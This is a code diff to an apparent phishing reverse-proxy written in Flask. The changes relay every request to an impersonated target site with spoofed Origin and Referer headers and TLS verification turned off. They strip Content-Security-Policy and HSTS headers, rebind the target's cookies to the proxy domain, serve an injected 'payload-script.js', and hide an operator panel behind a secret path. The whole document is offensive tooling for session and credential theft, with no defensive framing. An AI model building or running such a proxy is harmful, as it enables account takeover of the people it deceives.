@@ -52,11 +52,18 @@ def start_proxy(target, host, port, secret):
     def panel_files(filename):
         return send_from_directory('panel', filename)
 
-    @app.route('/', defaults={'path': ''})
-    @app.route('/<path:path>')
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('.', 'payload-script.js')
+
+    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
         if path.startswith(secret):
-            return panel_index()
+            if path == secret:
+                return panel_index()
+            filename = path[len(secret)+1:]
+            return panel_files(filename)
 
         try:
             # Build target URL
@@ -64,23 +71,27 @@ def start_proxy(target, host, port, secret):
             if request.query_string:
                 target_url += f"?{request.query_string.decode()}"
 
+            print(f"{Fore.CYAN}[*] Proxying request to: {target_url}{Fore.RESET}")
+
+            # Prepare headers
+            headers = {
+                key: value for key, value in request.headers.items()
+                if key.lower() not in ['host', 'content-length', 'content-encoding']
+            }
+            headers['Host'] = target
+            headers['Origin'] = f'https://{target}'
+            headers['Referer'] = f'https://{target}/'
+
             # Forward the request
             resp = session.request(
                 method=request.method,
                 url=target_url,
-                headers={key: value for key, value in request.headers.items() 
-                        if key.lower() not in ['host']},
+                headers=headers,
                 data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=False  # Don't follow redirects automatically
+                allow_redirects=True,
+                verify=False
             )
-
-            # Handle redirects manually
-            if resp.status_code in [301, 302, 303, 307, 308]:
-                location = resp.headers.get('Location', '')
-                if location.startswith('http'):
-                    location = '/' + location.split('/', 3)[-1]
-                return Response('', resp.status_code, {'Location': location})
 
             # Process the response
             content = resp.content
@@ -96,21 +107,33 @@ def start_proxy(target, host, port, secret):
                 except:
                     pass
 
-            # Forward the response
-            headers = [(k, v) for k, v in resp.headers.items() 
-                      if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']]
+            # Prepare response headers
+            excluded_headers = [
+                'content-encoding', 
+                'content-length', 
+                'transfer-encoding', 
+                'connection',
+                'strict-transport-security',
+                'content-security-policy'
+            ]
             
+            headers = [
+                (k, v) for k, v in resp.headers.items()
+                if k.lower() not in excluded_headers
+            ]
+
+            # Create response
             response = Response(content, resp.status_code, headers)
-            
-            # Copy cookies
+
+            # Handle cookies
             for cookie in resp.cookies:
                 response.set_cookie(
                     key=cookie.name,
                     value=cookie.value,
-                    path=cookie.path or '/',
-                    domain=request.host
+                    domain=request.host,
+                    path=cookie.path or '/'
                 )
-            
+
             return response
 
         except Exception as e:
